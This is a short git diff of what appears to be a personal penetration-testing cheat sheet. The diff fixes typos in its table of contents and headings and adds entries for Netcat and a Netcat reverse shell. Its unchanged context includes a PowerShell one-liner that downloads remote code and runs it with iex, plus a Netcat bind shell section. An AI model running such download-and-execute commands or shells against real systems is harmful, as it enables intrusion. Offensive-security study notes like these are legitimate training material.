@@ -3,8 +3,12 @@
 > 106_Sam
 
 ## Table of Content
- 1. [Mangaing Process](#managing-process)
- 2. [Mangaing Process](#managing-process)
+ 1. [Managing Process](#managing-process)
+ 2. [Downlaoding Files](#downloading-files)
+ 3. [Customizing the Bash Environment](#customizing-the-bash-environment)
+ 4. [Practical Tools](#practical-tools)
+    - [Netcat](#netcat)
+    - [NetCat Reverse Shell](#netcat-reverse-shell)
 
 
 ## Managing process
@@ -45,7 +49,7 @@ iex (New-Object System.Net.Webclient).DownloadString('<URL>')
 ```
 ---
 
-## Customizing the Bash Environmeent
+## Customizing the Bash Environment
 _Bash history customization_
 ```bash
 export HISTCONTROL=ignoredups
@@ -137,7 +141,7 @@ Windows &rarr; Linux
 
 _4. Remote Administration with Netcat_
 
-##NetCat Bind Shell 
+## NetCat Bind Shell 
 
 _DGaping security hole_
 
